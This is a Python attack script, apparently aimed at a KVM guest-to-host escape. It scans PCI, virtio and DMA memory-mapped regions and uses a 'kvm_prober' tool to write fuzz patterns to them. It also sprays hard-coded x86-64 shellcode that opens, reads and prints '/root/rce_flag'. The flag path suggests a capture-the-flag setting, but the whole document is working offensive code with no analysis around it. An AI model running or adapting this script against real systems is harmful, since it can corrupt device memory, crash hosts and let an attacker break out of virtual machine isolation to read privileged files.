import os, sys, subprocess, random, time, binascii, re
from concurrent.futures import ThreadPoolExecutor

OFFSETS_PER_REGION = [0x10, 0x20, 0x40, 0x80, 0x100, 0x200]
FUZZ_LENGTHS = [16, 32, 64, 128, 256, 512, 1024, 2048, 4096]
PATTERNS = [
    b"\x00" * 128, b"\xff" * 128, b"A" * 128, os.urandom(128)
]
LOG_FILE = "payload_write_log.txt"

def run_prober(cmd):
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
        return out
    except subprocess.CalledProcessError as e:
        print(f"[-] Prober error: {e.output.decode(errors='ignore')}")
        return b''

def read_mmio(addr, length):
    res = run_prober(['kvm_prober', 'readmmio_buf', f'{addr:x}', f'{length}'])
    try:
        hexline = res.strip().split(b'\n')[0]
        hexstr = b''.join([c for c in hexline if c in b'0123456789abcdefABCDEF'])
        return hexstr
    except Exception:
        return b''

def fuzz_offset(region, offset, shellcode_bytes):
    base = region + offset
    for length in FUZZ_LENGTHS:
        for pattern in PATTERNS:
            payload = (pattern * ((length // len(pattern)) + 1))[:length]
            hexstr = binascii.hexlify(payload).decode()
            before = read_mmio(base, length)
            run_prober(['kvm_prober', 'writemmio_buf', f'{base:x}', hexstr])
            time.sleep(0.001)
            after = read_mmio(base, length)
            if before != after:
                log_msg = (f"ADDR 0x{base:x}, LEN {length}\n"
                           f"BEFORE: {before[:128].decode()}...\n"
                           f"AFTER : {after[:128].decode()}...\n"
                           f"PAYLOAD: {hexstr[:128]}...\n\n")
                print(f"[!] Wrote to 0x{base:x} (len={length}), payload stuck!")
                with open(LOG_FILE, "a") as f:
                    f.write(log_msg)
    # Also spray shellcode at this offset
    hexstr = binascii.hexlify(shellcode_bytes).decode()
    before = read_mmio(base, len(shellcode_bytes))
    run_prober(['kvm_prober', 'writemmio_buf', f'{base:x}', hexstr])
    after = read_mmio(base, len(shellcode_bytes))
    if before != after:
        log_msg = (f"SHELLCODE @ 0x{base:x}\n"
                   f"BEFORE: {before.decode()}...\n"
                   f"AFTER : {after.decode()}...\n"
                   f"PAYLOAD: {hexstr}...\n\n")
        print(f"[!!] SHELLCODE STUCK at 0x{base:x}")
        with open(LOG_FILE, "a") as f:
            f.write(log_msg)

def find_pci_virtio_bars():
    bars = set()
    with open('/proc/iomem') as f:
        for line in f:
            if re.search(r'virtio|pci', line, re.IGNORECASE):
                m = re.match(r'^\s*([0-9a-f]+)-([0-9a-f]+)', line)
                if m:
                    start = int(m.group(1), 16)
                    end   = int(m.group(2), 16)
                    if (end-start) < 0x200000:
                        bars.add((start, end))
    # Fallback classic regions
    if not bars:
        bars = set([(0xfe800000, 0xfe900000), (0xfe600000, 0xfe700000), (0xfe400000, 0xfe500000)])
    return list(bars)

def find_dma_bars():
    bars = set()
    with open('/proc/iomem') as f:
        for line in f:
            m = re.match(r'^\s*([0-9a-f]+)-([0-9a-f]+) : (.*)', line)
            if m and ('pci' in m.group(3).lower() or 'virtio' in m.group(3).lower()):
                start = int(m.group(1), 16)
                end   = int(m.group(2), 16)
                if (end-start) > 0x100000:   # >1MB = 64-bit DMA window
                    bars.add((start, end))
    return list(bars)

def find_active_offsets(region, region_size, step=0x20):
    active = []
    for offset in range(0, region_size, step):
        addr = region + offset
        buf = read_mmio(addr, 64)
        if not (buf == b'' or set(buf) == {ord('0')}):  # not all zeros
            active.append(offset)
    return active

def main():
    shellcode_hex = (
        "4831C05048BF2F726F6F742F7263655F666C6167574889E74831F64831D2B0020F054889C74889E64831D2B2FF4831C00F054889C24889E64831FF40B7014831C0B0010F05"
    )
    shellcode_bytes = binascii.unhexlify(shellcode_hex)

    bars = find_pci_virtio_bars()
    dma_bars = find_dma_bars()
    all_bars = bars + dma_bars

    print(f"[!] Detected {len(all_bars)} PCI/MMIO/DMA BARs: {all_bars}")

    jobs = []
    for bar_start, bar_end in all_bars:
        print(f"[*] Scanning BAR 0x{bar_start:x} - 0x{bar_end:x} for active offsets...")
        region = bar_start
        region_size = min(bar_end - bar_start, 0x40000)  # Scan only first 256KB per bar for speed
        active_offsets = find_active_offsets(region, region_size, step=0x20)
        print(f"    [+] Found {len(active_offsets)} likely active offsets.")
        # Fuzz active offsets and a few random others
        rand_extra = set(random.sample(range(0, region_size, 0x20), min(25, max(1, region_size // 0x800))))
        for offset in set(active_offsets) | rand_extra:
            jobs.append((region, offset, shellcode_bytes))

    with ThreadPoolExecutor(max_workers=8) as pool:
        pool.map(lambda args: fuzz_offset(*args), jobs)

    print(f"Fuzzing complete. Check {LOG_FILE} for stuck payloads!")

if __name__ == "__main__":
    main()
